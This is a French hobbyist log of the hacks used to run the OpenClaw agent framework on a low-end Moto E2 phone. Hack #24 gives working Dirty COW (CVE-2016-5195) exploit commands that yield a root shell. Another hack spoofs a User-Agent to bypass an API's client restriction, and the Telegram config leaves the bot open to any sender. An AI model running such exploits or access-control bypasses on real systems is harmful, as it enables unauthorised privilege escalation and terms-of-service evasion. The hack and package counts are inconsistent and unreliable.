# PocketClaw — OpenClaw sur un Moto E2 (The Impossible Install)

> "They said it couldn't be done. We did it anyway. 40 hacks later."

**Date :** 10-11 février 2026
**Appareil :** Motorola Moto E2 (2015) — codename `surnia`/`otis`
**Objectif :** Faire tourner OpenClaw (framework d'agent AI autonome) sur un téléphone qui ne remplit AUCUNE des conditions minimales.

---

## Le Défi

| Spec | Moto E2 | Minimum OpenClaw | Écart |
|---|---|---|---|
| Android | 6.0 (Marshmallow) | 10+ | **4 versions en dessous** |
| RAM | 1 Go (920 Mo réels) | 3 Go | **3x moins** |
| CPU | Snapdragon 410 (ARM32) | ARM64 recommandé | **Architecture legacy** |
| Stockage interne | 8 Go (~663 Mo libres) | 2 Go+ libres | **3x moins** |
| Node.js Termux natif | v12 max | v22 | **10 versions majeures** |
| proot-distro | Pas dans les repos | Requis | **Inexistant** |
| dpkg/apt | Cassé (stat error) | Fonctionnel | **Inutilisable** |
| git | Impossible à installer | Requis par npm | **Absent** |

**Verdict officiel : IMPOSSIBLE.**
**Verdict réel : 33 hacks plus tard, ça tourne.**

---

## Préparation du Téléphone

Avant tout hack logiciel, le téléphone doit être allégé au maximum :

- **Launcher :** PocketClaw Launcher APK (8.5 KB WebView, see Hack #30)
- **Debloat :** Désactiver/supprimer toutes les apps inutiles (Google Play Movies, Google Music, etc.)
- **Optimisation batterie :** Désactiver l'optimisation batterie pour Termux (sinon Android le kill en arrière-plan)
- **Carte SD :** 4 Go minimum si le stockage interne < 16 Go (on a utilisé une 57 Go)
- **Termux :** Installer depuis F-Droid (la version Play Store est obsolète pour Android 6)

---

## Les 30 Hacks

### Hack #1 — proot-distro manuel
**Problème :** proot-distro n'est pas dans les repos Termux pour Android 6.
**Solution :** Installation manuelle depuis GitHub avec correction des placeholders.

```bash
# Télécharger depuis GitHub
curl -LO https://github.com/termux/proot-distro/archive/refs/heads/master.tar.gz
tar xf master.tar.gz
# Copier les scripts + fix des paths
```

### Hack #2 — Ubuntu 25.10 extraction manuelle
**Problème :** Le script d'installation officiel de proot-distro échoue.
**Solution :** Télécharger et extraire le rootfs .tar.xz manuellement avec `tar`.

```bash
PREFIX=/data/data/com.termux/files/usr
ROOTFS=$PREFIX/var/lib/proot-distro/installed-rootfs/ubuntu
mkdir -p $ROOTFS
# Télécharger le rootfs ARM
curl -LO https://cdimage.ubuntu.com/ubuntu-base/releases/25.10/release/ubuntu-base-25.10-base-armhf.tar.gz
tar xf ubuntu-base-25.10-base-armhf.tar.gz -C $ROOTFS
```

### Hack #3 — Node 22 binaire pré-compilé
**Problème :** dpkg est cassé dans proot (erreur stat sur les .so), impossible d'utiliser apt pour installer Node.
**Solution :** Télécharger le binaire ARM pré-compilé depuis nodejs.org directement.

```bash
# Depuis l'intérieur de proot Ubuntu
curl -LO https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-armv7l.tar.xz
tar xf node-v22.12.0-linux-armv7l.tar.xz
cp -r node-v22.12.0-linux-armv7l/* /usr/local/
node --version  # v22.12.0 ✅
```

### Hack #4 — hijack.js (Bionic Bypass)
**Problème :** `os.networkInterfaces()` crash sur Android 6 car la libc Bionic ne supporte pas certains appels réseau que Node.js attend.
**Solution :** Un fichier JavaScript qui override la fonction avant qu'OpenClaw ne charge.

```javascript
// /root/hijack.js
const os = require('os');
const _ni = os.networkInterfaces;
os.networkInterfaces = function() {
  try { return _ni.call(os); }
  catch(e) { return {}; }
};
```

**Usage :** `NODE_OPTIONS='-r /root/hijack.js'` dans toutes les commandes Node.

### Hack #5 — Git Wrapper Bridge
**Problème :** npm a besoin de git pour cloner certaines dépendances (libsignal-node). Git ne peut pas être installé dans proot (dpkg cassé).
**Solution :** Un wrapper script qui appelle le git natif de Termux depuis l'intérieur de proot Ubuntu.

```bash
#!/bin/bash
# /usr/local/bin/git (dans proot Ubuntu)
# Bridge vers le git de Termux
TERMUX_GIT=/data/data/com.termux/files/usr/bin/git
exec $TERMUX_GIT "$@"
```

### Hack #6 — Git Argument Parser
**Problème :** npm passe les arguments git dans un ordre que le wrapper ne gère pas bien.
**Solution :** Parser custom qui extrait l'URL et la destination des arguments dans n'importe quel ordre.

```bash
#!/bin/bash
# Version améliorée du git wrapper avec parsing d'arguments
TERMUX_GIT=/data/data/com.termux/files/usr/bin/git

# Extraire URL et destination peu importe l'ordre
URL=""
DEST=""
for arg in "$@"; do
  case "$arg" in
    http*|git@*) URL="$arg" ;;
    /*|./*) DEST="$arg" ;;
  esac
done

exec $TERMUX_GIT "$@"
```

### Hack #7 — --ignore-scripts (Skip llama.cpp)
**Problème :** llama.cpp ne compilera jamais sur 1 Go de RAM avec un Snapdragon 410.
**Solution :** `npm install -g openclaw --ignore-scripts` skip toute compilation native. On utilise des providers cloud (Gemini, Kimi) au lieu de modèles locaux.

**Impact :** Économise ~200 Mo de RAM et des heures de compilation. Aucune perte fonctionnelle puisqu'on utilise des API cloud.

### Hack #8 — npm cache sur carte SD
**Problème :** 700 Mo de stockage interne, npm cache + node_modules = 500 Mo+.
**Solution :** Bind mount de la carte SD pour le cache npm.

```bash
# Monter le cache npm sur la SD
mkdir -p /sdcard/npm-cache
npm config set cache /sdcard/npm-cache
```

**Note :** Une carte SD de 4 Go suffit. On en avait une de 57 Go.

### Hack #9 — --legacy-peer-deps
**Problème :** Conflits de versions entre les dépendances npm.
**Solution :** `npm install -g openclaw --ignore-scripts --legacy-peer-deps`

### Hack #10 — run-proot.sh Helper
**Problème :** Lancer proot avec tous les bons bind mounts et variables d'environnement est complexe.
**Solution :** Script helper qui encapsule tout.

```bash
#!/data/data/com.termux/files/usr/bin/bash
# /data/data/com.termux/files/usr/bin/run-proot
PREFIX=/data/data/com.termux/files/usr
ROOTFS=$PREFIX/var/lib/proot-distro/installed-rootfs/ubuntu
unset LD_PRELOAD
export PROOT_TMP_DIR=$PREFIX/tmp

# Load API keys
if [ -f "$ROOTFS/root/.openclaw/env" ]; then
  source "$ROOTFS/root/.openclaw/env"
  export MOONSHOT_API_KEY
fi

proot \
  --link2symlink \
  --kill-on-exit \
  --root-id \
  --rootfs=$ROOTFS \
  --bind=/dev \
  --bind=/proc \
  --bind=/sys \
  --bind=$PREFIX/tmp:/tmp \
  --bind=/storage/emulated/0:/sdcard \
  --cwd=/root \
  /bin/bash -c "export PATH=/data/data/com.termux/files/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin && export HOME=/root && export NODE_OPTIONS='-r /root/hijack.js' && export MOONSHOT_API_KEY='$MOONSHOT_API_KEY' && $*"
```

### Hack #11 — Low-Memory Mode (max-old-space-size)
**Problème :** Le gateway OpenClaw demande 218+ Mo de heap JS. Avec Android + proot, OOM kill systématique.
**Solution :** Limiter le heap Node.js et tuer les services Google avant le lancement.

```bash
# Dans start-openclaw.sh (valeur initiale, réduite à 192 avec les stubs — voir Hack #20)
export NODE_OPTIONS='-r /root/hijack.js --max-old-space-size=384'

# Tuer les services Google gourmands
# ⚠️ NE PAS tuer com.google.android.gms (voir Hack #13)
am force-stop com.google.android.inputmethod.latin
am force-stop android.process.media
am force-stop android.process.acore
am force-stop com.google.process.gapps
```

**Budget RAM (final après Hacks #18-20) :**
- MemTotal : 920 Mo
- Android + GMS : ~430 Mo (non rooté, ne peut pas freeze GMS)
- Gateway RSS : ~178 Mo (avec ESM stubs + heap 192)
- Marge : ~140 Mo (~15% de la RAM)

### Hack #12 — Bypass systemd + gateway run
**Problème :** `openclaw gateway start` tente de se registrer comme service systemd (cherche `systemctl` et `$DBUS_SESSION_BUS_ADDRESS`), ce qui n'existe pas dans proot.
**Solution (3 fixes combinés) :**

1. **`gateway run` au lieu de `gateway start`** — lance le gateway en foreground sans daemonisation systemd
2. **`DBUS_SESSION_BUS_ADDRESS=disabled:`** — désactive la recherche du bus DBUS
3. **`XDG_RUNTIME_DIR=/tmp`** — fournit un runtime dir valide
4. **`gateway.mode=local`** dans la config JSON — mode local sans service discovery
5. **`gateway.auth.token`** dans la config — token d'authentification requis par le gateway

```bash
export XDG_RUNTIME_DIR=/tmp
export DBUS_SESSION_BUS_ADDRESS=disabled:
openclaw gateway run --port 9000 --verbose
```

**Statut : ✅ RÉSOLU — Gateway opérationnel sur ws://127.0.0.1:9000**

---

### Hack #13 — Ne PAS tuer Google Mobile Services
**Problème :** Pour libérer de la RAM (Hack #11), on tuait `com.google.android.gms` et `com.google.android.gsf`. Résultat : le WiFi perd sa **route par défaut** (default gateway). Le téléphone garde son IP locale (ex: `192.168.1.XX`) mais ne peut plus sortir sur internet → `ENETUNREACH` sur toutes les requêtes.

**Symptôme :** `ping 8.8.8.8` → `Network is unreachable`, mais `ip addr show wlan0` montre une IP valide.

**Root cause :** GMS gère la connectivité réseau sur Android 6. Le tuer = plus de routage.

**Solution :** Retirer `am force-stop com.google.android.gms` et `com.google.android.gsf` du script `start-openclaw.sh`. On garde les autres kills (clavier, media, contacts) qui libèrent de la RAM sans casser le réseau.

```bash
# ❌ NE PAS FAIRE :
am force-stop com.google.android.gms
am force-stop com.google.android.gsf

# ✅ OK à tuer :
am force-stop com.google.android.inputmethod.latin  # clavier Google
am force-stop android.process.media                   # gestionnaire média
am force-stop android.process.acore                   # contacts
am force-stop com.google.process.gapps               # Play Store services
```

**Statut : ✅ RÉSOLU — Script mis à jour, internet fonctionnel**

**⚠️ Si le dégât est déjà fait** (GMS déjà tué et route perdue) : aucune commande ADB ne peut restaurer la route sans root. Il faut **manuellement sur le téléphone** : Paramètres → WiFi → appui long sur le réseau → "Oublier" → se reconnecter. Ça force un cycle DHCP complet qui remet la route par défaut.

### Hack #15 — IPv6 DNS + autoSelectFamily
**Problème :** Même après fix de la route IPv4, certains services (Telegram) échouent en DNS IPv4 dans proot. Le resolver DNS standard (`8.8.8.8`) renvoie `ECONNREFUSED` par intermittence depuis proot.

**Solution :** Forcer le DNS IPv6 dans `/etc/resolv.conf` + activer `autoSelectFamily` dans la config OpenClaw pour que Node.js essaie IPv6 en premier quand IPv4 échoue.

```bash
# Dans proot :
echo "nameserver 2001:4860:4860::8888" > /etc/resolv.conf
echo "nameserver 2001:4860:4860::8844" >> /etc/resolv.conf
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
```

```json
// Dans openclaw.json, sous channels.telegram :
{
  "channels": {
    "telegram": {
      "network": {
        "autoSelectFamily": true
      }
    }
  }
}
```

**Statut : ✅ RÉSOLU — Telegram se connecte via IPv6**
**Problème :** Même avec `channels.telegram` configuré dans `openclaw.json`, le gateway log `"Unknown channel: telegram"` et `"Chat channels: (empty)"`. Le plugin est installé (`extensions/telegram/`) mais pas activé.

**Root cause :** `openclaw doctor` a révélé que `plugins.entries.telegram.enabled` était à `false`. La config `channels` ne suffit pas — il faut aussi activer le **plugin**.

**Solution (2 étapes) :**

1. Lancer `openclaw doctor --fix` (ajoute la structure `plugins.entries`)
2. Patcher manuellement le JSON pour forcer `plugins.entries.telegram.enabled: true`

```bash
# Depuis proot :
node -e "
const fs = require('fs');
const cfg = JSON.parse(fs.readFileSync('/root/.openclaw/openclaw.json', 'utf8'));
if (!cfg.plugins) cfg.plugins = {};
if (!cfg.plugins.entries) cfg.plugins.entries = {};
cfg.plugins.entries.telegram = { enabled: true };
fs.writeFileSync('/root/.openclaw/openclaw.json', JSON.stringify(cfg, null, 2));
console.log('Telegram plugin enabled');
"
```

**Config Telegram complète dans `openclaw.json` :**
```json
{
  "channels": {
    "telegram": {
      "enabled": true,
      "botToken": "XXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
      "dmPolicy": "open",
      "allowFrom": ["*"]
    }
  },
  "plugins": {
    "entries": {
      "telegram": { "enabled": true }
    }
  }
}
```

**Note :** Le `botToken` est en dur dans le JSON (pas via `${TELEGRAM_BOT_TOKEN}`) car l'interpolation des variables d'environnement ne fonctionne pas pour tous les champs à travers proot.

**Bot Telegram :** `@pocketclawbot` (créé via @BotFather)

**Statut : ✅ Plugin activé, gateway reload la config automatiquement**

### Hack #16 — Kimi Coding Provider + User-Agent Spoof
**Problème (3 obstacles enchaînés) :**

1. La clé API `sk-kimi-xxx` vient de **Kimi Coding** (kimi.com), pas de **Moonshot** (platform.moonshot.ai). Ce sont deux produits séparés avec des endpoints incompatibles.
2. L'endpoint Kimi Coding (`api.kimi.com/coding/v1`) rejette les requêtes qui ne viennent pas d'un "coding agent" reconnu (Claude Code, Kimi CLI, Roo Code, etc.) → erreur 403.
3. Le modèle `kimi-for-coding` retourne un champ `reasoning_content` (chaîne de pensée) en plus du `content`. Quand le content est vide, OpenClaw interprète ça comme un conflit → "Message ordering conflict".

**Solution (3 fixes combinés) :**

1. **Changer le provider** de `moonshot` à `kimi-coding` avec le bon endpoint `https://api.kimi.com/coding/v1`
2. **Spoofer le User-Agent** en `claude-code/1.0` pour passer la restriction d'accès (l'API vérifie le header, pas le client réel)
3. **Ajouter `reasoning: false`** dans la config du modèle pour éviter le champ `reasoning_content`

```json
{
  "models": {
    "providers": {
      "kimi-coding": {
        "baseUrl": "https://api.kimi.com/coding/v1",
        "apiKey": "sk-kimi-xxx",
        "api": "openai-completions",
        "headers": {
          "User-Agent": "claude-code/1.0"
        },
        "models": [{
          "id": "kimi-for-coding",
          "contextWindow": 262144,
          "maxTokens": 8192,
          "reasoning": false,
          "headers": {
            "User-Agent": "claude-code/1.0"
          }
        }]
      }
    }
  },
  "agents": {
    "defaults": {
      "model": {
        "primary": "kimi-coding/kimi-for-coding"
      }
    }
  }
}
```

**Discovery :** OpenClaw a un support natif `kimi-coding` (`applyKimiCodeConfig()` dans le source), trouvé par grep dans les fichiers `.js` minifiés. Le modèle interne est `k2p5`.

**Statut : ✅ RÉSOLU — Bot répond via Telegram avec Kimi Coding 262K contexte**

### Hack #17 — Termux:Boot Auto-Start
**Problème :** Si le téléphone s'éteint (batterie morte, crash, coupure), il faut physiquement ouvrir Termux et taper `restart-gw` pour relancer le bot. Pas viable pour un appareil autonome dans un placard.

**Solution :** Installer Termux:Boot (app séparée) qui exécute automatiquement un script au démarrage d'Android.

**Installation :**
```bash
# Depuis le PC via ADB
curl -L -o termux-boot.apk "https://github.com/termux/termux-boot/releases/download/v0.8.1/termux-boot-app_v0.8.1+github.debug.apk"
adb install termux-boot.apk
# ⚠️ Ouvrir l'app Termux:Boot UNE FOIS sur le téléphone pour activer le receiver
```

**Script de boot :**
```bash
mkdir -p ~/.termux/boot
cat > ~/.termux/boot/start-openclaw.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
# Attendre que le WiFi se connecte
sleep 15

# Démarrer SSH
sshd

# Démarrer le gateway
nohup start-openclaw > /data/data/com.termux/files/usr/tmp/openclaw-gateway.log 2>&1 &

echo "Boot complete: sshd + openclaw started"
EOF
chmod +x ~/.termux/boot/start-openclaw.sh
```

**Cycle de vie :**
1. Téléphone s'éteint (batterie morte)
2. Tu le recharges → il rallume automatiquement (ou tu appuies sur power)
3. Android boot → Termux:Boot se lance → attend 15s (WiFi) → sshd + gateway démarrent
4. ~1 minute après le boot → le bot répond sur Telegram
5. Zéro intervention manuelle

**Statut : ✅ RÉSOLU — Autonomie complète, auto-restart au boot**

### Hack #18 — Compile cache cleanup
**Problème :** Node 22 compile automatiquement les modules en bytecode via `module.enableCompileCache()`. Après plusieurs redémarrages, 51 Mo de caches dupliqués s'accumulent dans `$PREFIX/tmp/node-compile-cache/`.

**Solution :** Supprimer périodiquement le dossier. Le cache se reconstruit au prochain boot (~27 Mo). Les reboots suivants sont plus rapides grâce au bytecode pré-compilé.

```bash
rm -rf $PREFIX/tmp/node-compile-cache/
# Se reconstruit automatiquement au prochain start
```

**Gain :** 24 Mo de disque récupérés (51 Mo → 27 Mo). Inclus dans le cron `logrotate-pc`.

### Hack #19 — ESM stubs pour packages inutiles
**Problème :** OpenClaw bundle **tous** les SDK de channels (Slack, Discord, WhatsApp, LINE, Playwright) via Rolldown (ESM). Même avec les channels désactivés, ESM résout tous les `import` au link-time — **avant** que le code s'exécute. Supprimer les packages npm casse le boot (`ERR_MODULE_NOT_FOUND`). Les stubs CJS ne marchent pas non plus (0 `require()` dans le bundle, tout est ESM).

**Discovery :** Le compile cache montrait que ces fichiers n'étaient pas compilés en bytecode — mais ça veut juste dire que le code n'est pas optimisé par V8, **pas** qu'il n'est pas chargé. ESM linking ≠ compilation. Le mauvais indicateur nous a fait perdre du temps.

**Solution :** Créer des **stub packages ESM** qui exportent les bons noms (classes/fonctions vides). Node résout les imports, le module graph est satisfait, mais le code n'est jamais appelé.

```javascript
// Exemple: node_modules/@slack/web-api/index.js (stub)
export class WebClient { constructor() {} }
```

**9 packages stubbés :** `@slack/web-api`, `@slack/bolt`, `@buape/carbon`, `discord-api-types`, `@line/bot-sdk`, `@whiskeysockets/baileys`, `playwright-core`, `@aws-sdk/client-bedrock{,-runtime}`, `@google/genai`

**10 packages supprimés** (pas importés du tout) : `@larksuiteoapi`, `@cloudflare`, `@mistralai`, `pdfjs-dist`, `@napi-rs`, `@img`, `@smithy`, `bun-types`, `libsignal`, `@types`, `@silvia-odwyer`, `rimraf`, `web-streams-polyfill`

```bash
# Créer les stubs (depuis Termux, pas proot)
bash scripts/create-stubs.sh
# Re-run après chaque `openclaw update`
```

**Gain :** -42 Mo RSS (224 → 182 Mo), node_modules 413 → 151 Mo (-262 Mo), disque libre +323 Mo.

**Leçon ESM vs CJS :**
- CJS : `require()` dans un `if (false)` ne charge jamais le module
- ESM : `import { X } from "pkg"` est résolu au link-time, avant toute exécution
- Compile cache = ce qui est compilé en bytecode (optimisation CPU)
- Import ESM = ce qui est chargé en mémoire (consommation RAM)

### Hack #20 — Heap 192 Mo (post-stubs, binary search)
**Problème :** Le heap V8 (`--max-old-space-size`) contrôle combien de mémoire le *old space* JavaScript peut utiliser. Avant les stubs : 256 Mo = OOM, 320 Mo = OOM, 384 Mo = minimum. V8 expand pour remplir le heap disponible.

**Discovery :** Avec les stubs ESM (Hack #19), le boot peak est beaucoup plus bas. On a fait un binary search complet pour trouver le minimum :

| Heap | Boot | RSS | Peak (VmHWM) |
|---|---|---|---|
| 384 (avant stubs) | ✅ | 196 Mo | ? |
| 350 | ✅ | 183 Mo | ? |
| 320 | ✅ | 180 Mo | 197 Mo |
| 288 | ✅ | 173 Mo | 196 Mo |
| 256 | ✅ | 177 Mo | 198 Mo |
| 224 | ✅ | 177 Mo | 197 Mo |
| 192 | ✅ | 178 Mo | 196 Mo |
| 160 | ✅ | 182 Mo | 196 Mo |
| 128 | ✅ | 172 Mo | 195 Mo |
| **96** | **OOM** | — | — |

**Conclusion :** Le heap JS réel est entre 96 et 128 Mo. Le RSS process (~175-180 Mo) est **incompressible** — c'est le code natif Node.js + V8 engine + buffers + mmap, pas le heap JS. Baisser le heap en dessous de 128 ne réduit plus le RSS.

**Choix production : 192 Mo.** Ça laisse ~60-90 Mo de marge pour les requêtes LLM avec de gros contextes, le GC, et les pics de parsing JSON. Le minimum absolu est 128 Mo mais sans marge.

```bash
# Dans start-openclaw.sh
export NODE_OPTIONS='-r /root/hijack.js --expose-gc --max-old-space-size=192'
```

**Aussi testé et éliminé :**
- `--optimize-for-size` : pas autorisé dans `NODE_OPTIONS` (exit code 9)
- `--jitless` : -6 à -40% perf CPU, pas viable sur Snapdragon 410
- `--lite-mode` : flag compile-time V8, pas un flag runtime

**Gain :** RSS 224 → ~178 Mo (-46 Mo, -21%). Heap 384 → 192 Mo (-50%).

**Gains combinés Hacks #18-20 :** 224 Mo → 178 Mo RSS (-46 Mo, -21%), 148 Mo → 471 Mo disque libre (+323 Mo).

**Statut : ✅ RÉSOLU — Gateway stable à ~178 Mo RSS avec heap 192 Mo**

### Hack #21 — Android Debloat (sans root)
**Problème :** Android + GMS occupent ~430-450 Mo sur 920 Mo. Le gateway (178 Mo) + Android ne laissent que ~140 Mo de marge. On veut réduire l'empreinte Android.

**Tentative 1 — Supprimer GMS :**
```bash
# Toutes ces commandes échouent sans root :
adb shell pm uninstall -k --user 0 com.google.android.gms
# → DELETE_FAILED_DEVICE_POLICY_MANAGER

adb shell pm disable-user --user 0 com.google.android.gms
# → SecurityException: Permission Denial

adb shell pm hide com.google.android.gms
# → false
```
GMS est un Device Policy Manager sur Android 6 — impossible à supprimer, désactiver ou masquer sans root.

**Tentative 2 — Supprimer les packages non-essentiels (2 vagues) :**
```bash
# Vague 1 — 12 packages :
pm uninstall -k --user 0 com.google.android.inputmethod.latin    # clavier Google
pm uninstall -k --user 0 com.google.android.setupwizard          # setup wizard
pm uninstall -k --user 0 com.android.providers.calendar          # provider calendrier
pm uninstall -k --user 0 com.google.android.syncadapters.calendar # sync calendrier
pm uninstall -k --user 0 com.google.android.backuptransport      # backup
pm uninstall -k --user 0 com.google.android.configupdater        # config updater
pm uninstall -k --user 0 com.google.android.gsf.login            # GSF login
pm uninstall -k --user 0 com.android.mms                         # MMS
pm uninstall -k --user 0 com.android.calculator2                 # calculatrice
pm uninstall -k --user 0 com.motorola.camera                     # caméra
pm uninstall -k --user 0 com.android.dialer                      # téléphone
pm uninstall -k --user 0 com.android.bluetooth                   # bluetooth

# Vague 2 — 16 packages supplémentaires :
pm uninstall -k --user 0 com.android.captiveportallogin          # portail captif
pm uninstall -k --user 0 com.android.carrierconfig               # config opérateur
pm uninstall -k --user 0 com.android.certinstaller               # installeur certificats
pm uninstall -k --user 0 com.android.documentsui                 # gestionnaire fichiers
pm uninstall -k --user 0 com.android.inputdevices                # périphériques saisie
pm uninstall -k --user 0 com.android.mms.service                 # service MMS
pm uninstall -k --user 0 com.android.pacprocessor                # proxy PAC
pm uninstall -k --user 0 com.android.phone                       # téléphone
pm uninstall -k --user 0 com.android.providers.contacts          # provider contacts
pm uninstall -k --user 0 com.android.providers.downloads         # provider downloads
pm uninstall -k --user 0 com.android.providers.downloads.ui      # UI downloads
pm uninstall -k --user 0 com.android.providers.media             # provider média
pm uninstall -k --user 0 com.android.providers.telephony         # provider téléphonie
pm uninstall -k --user 0 com.android.proxyhandler                # proxy handler
pm uninstall -k --user 0 com.android.server.telecom              # serveur telecom
pm uninstall -k --user 0 com.motorola.android.providers.settings # settings Motorola
pm uninstall -k --user 0 com.qualcomm.qcrilmsgtunnel             # Qualcomm RIL
pm uninstall -k --user 0 com.google.android.webview              # WebView
pm uninstall -k --user 0 com.motorola.android.sepolicyupdate     # SEPolicy updater
pm uninstall -k --user 0 com.qualcomm.timeservice                # service temps Qualcomm
pm uninstall -k --user 0 com.android.backupconfirm               # confirmation backup
# Échoué : com.motorola.ccc.devicemanagement (DELETE_FAILED_DEVICE_POLICY_MANAGER)
```

```bash
# Vague 3 — 3 packages finaux :
pm uninstall -k --user 0 fr.neamar.kiss                          # KISS launcher (53 Mo, inutile — tout via SSH/Telegram)
pm uninstall -k --user 0 com.google.android.gsf                  # Google Services Framework (tue gapps, -41 Mo)
pm uninstall -k --user 0 com.android.location.fused              # location fused
```

**Total : 31 packages supprimés** (12 + 16 + 3). Seuls 2 résistent : `com.google.android.gms` et `com.motorola.ccc.devicemanagement` (Device Policy Manager).

**Incident vague 1 :** Pendant les uninstalls, le routage WiFi a été perdu temporairement (même symptôme que Hack #13). `svc wifi disable && svc wifi enable` n'a pas restauré la route. Recovery : `adb reboot`.

**Vague 2 :** Aucun incident réseau. Les 16 packages supprimés n'affectent pas le routage.

**Découvertes importantes :**
1. `pm uninstall -k --user 0` est **persistant** sur Android 6 — les packages ne reviennent PAS au reboot (contrairement à Android 10+)
2. `pm install-existing` n'existe PAS sur Android 6 (API 23) — pour restaurer, il faudrait un factory reset
3. La perte de route de la vague 1 était **transitoire** — après reboot, WiFi + routage fonctionnent parfaitement sans les 28 packages
4. GMS core (gms, gms.persistent, gms.unstable) est intouchable sans root

**Packages restants (intouchables) :**
```
android, com.android.systemui, com.android.settings, com.android.shell,
com.android.keychain, com.android.externalstorage, com.android.defcontainer,
com.android.location.fused, com.android.packageinstaller,
com.google.android.gsf, com.google.android.gms,
com.motorola.ccc.devicemanagement
```

**Statut : ⚠️ PARTIEL — 31 packages supprimés, GMS intouchable sans root**

### Hack #22 — Static IP + GMS Kill (le dernier mur)
**Problème :** GMS mange ~270 Mo de RAM (gms.persistent 136 Mo + gms 133 Mo). Le tuer coupe le WiFi (Hack #13) parce que GMS gère le routage DHCP.

**Discovery :** Le WiFi du téléphone était déjà en IP statique (settings). La route dans la table 1030 est `proto static` — elle ne dépend pas de GMS pour être maintenue.

```bash
# Vérification :
settings get global wifi_static_ip          # 1
settings get global wifi_static_ip_address  # <YOUR_PHONE_IP>
settings get global wifi_static_gateway     # <YOUR_GATEWAY_IP>
settings get global wifi_static_netmask     # 255.255.255.0
settings get global wifi_static_dns1        # 8.8.8.8

ip route show table 1030
# default via <YOUR_GATEWAY_IP> dev wlan0  proto static
```

**Test : tuer GMS avec IP statique :**
```bash
adb shell am force-stop com.google.android.gms
# → Route intacte, ping OK, gateway OK, 0 process GMS
# → MemFree passe de 53 Mo à 126 Mo, Cached 393 Mo
# → Total libre : ~520 Mo (était ~290 Mo)
```

**Résultat : GMS tué, réseau tient.** Mais GMS respawn automatiquement en ~2 minutes.

**Tentative cron kill depuis Termux :**
```bash
# Termux am (version allégée) :
am force-stop com.google.android.gms
# → "Error: unknown command 'force-stop'" (la commande n'existe pas)

# System am depuis Termux :
PATH=/system/bin:$PATH am force-stop com.google.android.gms
# → "SecurityException: Permission Denial: forceStopPackage() from uid=10001
#    requires android.permission.FORCE_STOP_PACKAGES"
```

**Constat :** `am force-stop` nécessite `FORCE_STOP_PACKAGES`, permission réservée au shell ADB (uid 2000). Termux tourne en uid 10001 — **tous les `am force-stop` dans les scripts Termux étaient des no-ops silencieux depuis le début.**

**Tentative ADB-from-Termux :**
- Binaire statique adb-arm (p2p-adb) : version 1.0.29, trop vieux pour l'auth RSA d'Android 6
- `adb tcpip 5555` active bien le port TCP, mais le vieux client ne peut pas s'authentifier

**Bilan des process kills depuis Termux vs ADB :**

| Action | ADB shell (uid 2000) | Termux SSH (uid 10001) |
|---|---|---|
| `am force-stop` | ✅ Fonctionne | ❌ Permission Denial |
| `am kill` (background) | ✅ Fonctionne | ❌ Commande inconnue |
| `pm uninstall -k --user 0` | ✅ Permanent | N/A (déjà fait) |
| `kill -9 PID` (autre uid) | ❌ Operation not permitted | ❌ Operation not permitted |

**Conséquence :** En mode autonome (sans USB), GMS respawn librement. Les 270 Mo ne sont récupérables que pendant une session ADB.

| Mode | RAM utilisée | RAM libre |
|---|---|---|
| USB + kills ADB | ~263 Mo | ~657 Mo (71%) |
| Autonome (GMS respawn) | ~522 Mo | ~398 Mo (43%) |

**Fix définitif : root.** Avec root, `am force-stop` fonctionne depuis n'importe quel uid, et on peut `pm uninstall --user 0 com.google.android.gms` (plus de Device Policy Manager restriction).

**Statut : ⚠️ BLOQUÉ — GMS tuable depuis ADB mais pas depuis Termux. Root requis pour autonomie.**

### Hack #23 — API Keys hors de `ps` output
**Problème :** Les clés API (Kimi, Telegram, OpenAI) étaient passées en arguments de la commande `proot`, visibles en clair dans `ps -eo args`.

**Solution :** Charger les clés depuis `/root/.openclaw/env` à l'intérieur de proot au lieu de les passer en ligne de commande.

```bash
# Avant (visible dans ps) :
proot ... /bin/bash -c "... && export TELEGRAM_BOT_TOKEN='8360...' && ..."

# Après (invisible dans ps) :
proot ... /bin/bash -c "... && . /root/.openclaw/env && export MOONSHOT_API_KEY KIMI_API_KEY TELEGRAM_BOT_TOKEN OPENAI_API_KEY && ..."
```

**Statut : ✅ RÉSOLU — Clés API invisibles dans `ps`**

### Hack #24 — Dirty COW Root (CVE-2016-5195)
**Problème :** Le kernel 3.10.49 du Moto E2 n'a jamais été patché contre Dirty COW. On a besoin de root pour tuer GMS (-270 Mo), mais le bootloader est verrouillé.

**Solution :** Exploit Dirty COW — race condition dans le copy-on-write du kernel Linux qui permet d'écraser des fichiers read-only (comme `/system/bin/run-as`).

```bash
# Télécharger les sources (timwr/CVE-2016-5195)
curl -sL -o dirtycow.c https://raw.githubusercontent.com/timwr/CVE-2016-5195/master/dirtycow.c
curl -sL -o dcow.c https://raw.githubusercontent.com/timwr/CVE-2016-5195/master/dcow.c
curl -sL -o run-as.c https://raw.githubusercontent.com/timwr/CVE-2016-5195/master/run-as.c

# Compiler dans Termux (clang 9)
cat > logfix.h << 'EOF'
#define __android_log_print(...) (0)
#define ANDROID_LOG_INFO 4
EOF
clang -pthread -include logfix.h -DPRINT -o dirtycow dirtycow.c dcow.c -Wall
clang -o run-as-payload run-as.c -ldl -Wall

# Copier vers /data/local/tmp (accessible par ADB shell)
cp dirtycow run-as-payload /sdcard/
# Puis depuis ADB shell :
cp /sdcard/dirtycow /data/local/tmp/ && cp /sdcard/run-as-payload /data/local/tmp/
chmod 755 /data/local/tmp/dirtycow /data/local/tmp/run-as-payload

# Exploiter !
/data/local/tmp/dirtycow /data/local/tmp/run-as-payload /system/bin/run-as
# "patch successful, iterations 1"

# Root shell
/system/bin/run-as
# uid=0(root) gid=0(root)
```

**Résultat :** Root temporaire (perdu au reboot — /system est read-only, Dirty COW modifie seulement le page cache).

**Ce que root peut faire :**
- `am force-stop com.google.android.gms` → -270 Mo instantanément
- `pm disable com.google.android.gms` → GMS ne respawne plus
- `pm enable/install` → restaurer des packages

**Ce que root NE PEUT PAS faire (SELinux `u:r:shell:s0` bloque) :**
- `sysctl -w vm.swappiness=10` → Permission denied
- `setenforce 0` → Permission denied
- `ip route add` → Permission denied
- Accéder à `/data/system/` → Permission denied
- Écrire dans `/cache/` → Permission denied

**Statut : ✅ FONCTIONNE — Root temporaire, GMS tué, 265 Mo total sans GMS**

### Hack #25 — Recovery après Boot Loop (leçon douloureuse)
